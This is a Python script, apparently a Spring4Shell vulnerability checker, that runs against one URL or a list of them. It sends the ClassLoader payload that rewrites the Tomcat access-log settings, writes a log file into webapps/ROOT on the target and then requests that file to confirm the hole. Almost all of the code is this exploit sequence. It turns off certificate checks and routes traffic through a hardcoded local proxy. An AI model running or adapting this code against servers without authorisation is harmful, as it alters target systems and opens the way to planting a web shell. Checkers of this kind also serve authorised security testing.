import requests,argparse,os,binascii,time

from termcolor import cprint

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


parser = argparse.ArgumentParser()

parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')

args = parser.parse_args()

def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    check_spring4shell(urls)

def check_spring4shell(urls):

        for url in urls:
                cprint ("[+] checking: "+url,"yellow")
                try:
                        proxy = {'http':'http://127.0.0.1:8081'}
                        headers = {"Content-Type":"application/x-www-form-urlencoded"}
                        random_bytes = binascii.b2a_hex(os.urandom(15))
                        encoding = 'utf-8'
                        #random_log_file = f'{ str(random_bytes,encoding) }'
                        random_log_file = "testing"
                        data = (
                                '&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.log'
                                '&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT'
                                f'&class.module.classLoader.resources.context.parent.pipeline.first.prefix={ random_log_file }'
                                '&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
                                )
                        reset = 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_'
                        print("resetting log")
                        z = requests.post(url+"helloworld/greeting/",data=reset,headers=headers,proxies=proxy,verify=False,allow_redirects=False,timeout=5)
                        print(str(z.status_code))
                        print(f"sending post request to create log file: \n{ random_log_file }")
                        response = requests.post(url+"helloworld/greeting/",data=data,headers=headers,proxies=proxy,verify=False,allow_redirects=False,timeout=5)
                        print(response.status_code)
                        print("checking if file got uploaded ...")
                        time.sleep(10)
                        x = requests.get(url+random_log_file+".log", timeout=15,proxies=proxy, allow_redirects=False, verify=False)
                        print(x.status_code)
                        if x.status_code == 200:
                                print(f"got a hit on the random log file { random_log_file }.log\n TARGET IS VULNERABLE!")
                        elif x.status_code != 200:
                                print('got status code: ' + str(x.status_code)+" trying again ...\n")
                                time.sleep(4)
                                y = requests.get(url+random_log_file+".log",timeout=15,proxies=proxy,allow_redirects=False,verify=False)
                                if y.status_code == 200:
                                        print(f"got a hit on the random log file { random_log_file }.log\n TARGET IS VULNERABLE!")
                                else:
                                        print("nothing happened!\n Quitting")
                                        exit()
                except requests.exceptions.RequestException as e:
                        pass

main()
